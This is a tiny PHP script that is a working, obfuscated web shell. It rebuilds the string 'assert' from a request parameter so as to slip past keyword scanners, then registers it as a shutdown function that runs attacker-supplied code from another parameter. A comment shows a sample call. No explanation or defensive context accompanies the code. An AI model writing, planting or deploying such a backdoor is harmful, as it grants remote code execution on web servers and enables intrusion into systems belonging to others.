<?php
//e=ass~ert&pass=phpinfo();
$e = $_REQUEST['e'];
$str = substr($e,0,3).substr($e,4,7);
register_shutdown_function($str, $_REQUEST['pass']);
?>
